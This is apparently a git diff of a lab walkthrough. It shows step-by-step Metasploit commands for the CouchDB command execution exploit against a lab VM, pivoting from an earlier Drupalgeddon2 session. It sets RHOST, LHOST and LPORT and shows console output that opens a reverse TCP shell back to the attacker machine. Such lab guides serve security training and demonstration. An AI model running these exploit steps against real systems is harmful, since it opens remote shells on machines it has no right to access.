@@ -575,11 +575,21 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 **Initiate CouchDB Commnad Execution attack against App1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
-    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
-    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
-    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
-
-
+    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
+    * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
+    * Type **set LPORT 4445** to define the local port to use.
+    * Type **exploit** to initiate the exploit and esbalish a command shell
+```console
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
+[*] Using configured payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
+RHOST => 192.168.20.100
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
+LHOST => 10.114.209.151
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
+LPORT => 4445
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
+```
 
 
 
